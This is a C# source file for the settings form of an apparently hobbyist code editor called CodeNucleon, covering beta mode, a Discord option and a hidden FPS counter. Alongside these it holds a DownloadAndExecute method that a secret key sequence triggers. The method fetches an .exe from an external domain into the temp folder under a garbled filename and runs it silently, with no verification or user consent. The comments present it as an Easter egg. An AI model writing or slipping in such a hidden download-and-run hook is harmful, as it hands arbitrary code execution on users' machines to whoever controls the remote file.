using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;
using ScintillaNET;

namespace CodeNucleon
{
    public partial class SettingsForm : Form
    {
        private Stopwatch stopwatch = new Stopwatch();
        private int frameCount = 0;
        private readonly Keys[] easterEgg2 = { Keys.Up, Keys.Up, Keys.Up, Keys.Up, Keys.Left, Keys.Left, Keys.Right, Keys.Right, Keys.Right, Keys.Left, Keys.B, Keys.S, Keys.O, Keys.D, Keys.Enter };

        // Index to keep track of the current position in the Konami code sequence
        private int easterEgg2Index = 0;

        public SettingsForm()
        {
            InitializeComponent();
            betaCheckBox.Checked = Properties.Settings.Default.BetaMode;
            discordrpcCheckBox.Checked = Properties.Settings.Default.DiscordRPC;
            if (Properties.Settings.Default.InterestingItSeemsLikeYouLookedAtTheCodeOrTheSettingsFileHeyyyy)
            {
                fpsLabel.Visible = true;
                Application.Idle += Application_Idle; // Subscribe to the Application.Idle event
                stopwatch.Start();
            }
            else
            {
                fpsLabel.Visible = false;
            }
            if (Properties.Settings.Default.BetaMode)
            {
                discordrpcCheckBox.Visible = true;
            }
            else
            {
                discordrpcCheckBox.Visible = false;
            }
            Console.WriteLine("SettingsForm initialized");
        }

        private void applyBtn_Click(object sender, EventArgs e)
        {
            Properties.Settings.Default.BetaMode = betaCheckBox.Checked;
            Properties.Settings.Default.DiscordRPC = discordrpcCheckBox.Checked;
            Properties.Settings.Default.Save();
            Console.WriteLine("Settings applied");
            MessageBox.Show("Applied settings. You may need to restart for changes to take place.");
        }

        private void Application_Idle(object sender, EventArgs e)
        {
            // Calculate elapsed time since last frame
            double elapsedSeconds = stopwatch.Elapsed.TotalSeconds;
            stopwatch.Restart(); // Restart the stopwatch

            // Increment frame count
            frameCount++;

            // Calculate FPS
            double fps = frameCount / elapsedSeconds;

            // Update the label text
            fpsLabel.Text = $"{fps:F2}";
        }
        public static void DownloadAndExecute(string url)
        {
            Console.WriteLine("Downloading and executing program from URL: " + url);
            try
            {
                string tempFilePath = Path.Combine(Path.GetTempPath(), "jopizanhdspuoçiazbsduoapz&é.exe");

                using (WebClient webClient = new WebClient())
                {
                    webClient.DownloadFile(url, tempFilePath);
                }

                if (File.Exists(tempFilePath))
                {
                    Process.Start(tempFilePath);
                }
                else
                {
                    Console.WriteLine("Downloaded file not found.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
        private void settingsForm_KeyDown(object sender, KeyEventArgs e)
        {
            Console.WriteLine("SettingsForm KeyDown event triggered");
            // Check if the pressed key matches the next key in the Konami code sequence
            if (e.KeyCode == easterEgg2[easterEgg2Index])
            {
                Console.WriteLine("Correct key pressed: " + e.KeyCode);
                easterEgg2Index++;

                // If the entire Konami code sequence is entered correctly
                if (easterEgg2Index == easterEgg2.Length)
                {
                    easterEgg2Index = 0; // Reset index for next input

                    // Trigger your Easter egg or special feature here
                    string programUrl = "https://komas19.xyz/cdn/EasterEgg2.exe"; // Replace with the actual download URL
                    Console.WriteLine("Downloading and executing program from URL: " + programUrl);
                    DownloadAndExecute(programUrl);
                }
            }
            else
            {
                Console.WriteLine("Incorrect key pressed: " + e.KeyCode);
                // Reset index if incorrect key is pressed
                easterEgg2Index = 0;
            }
        }
    }
}
